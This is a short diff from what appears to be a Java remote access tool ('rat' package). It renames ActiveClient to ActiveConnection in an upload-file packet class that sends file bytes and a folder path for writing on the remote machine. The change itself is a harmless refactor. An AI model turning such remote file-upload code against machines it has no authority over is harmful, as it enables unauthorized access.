@@ -3,7 +3,7 @@ package de.sogomn.rat.packet;
 import java.io.File;
 
 import de.sogomn.engine.util.FileUtils;
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class UploadFilePacket implements IPacket {
 	
@@ -28,7 +28,7 @@ public final class UploadFilePacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeInt(data.length);
 		client.write(data);
 		client.writeUTF(folderPath);
@@ -36,7 +36,7 @@ public final class UploadFilePacket implements IPacket {
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		final int length = client.readInt();
 		
 		data = new byte[length];
@@ -48,7 +48,7 @@ public final class UploadFilePacket implements IPacket {
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		final File folder = new File(folderPath);
 		
 		String path = null;
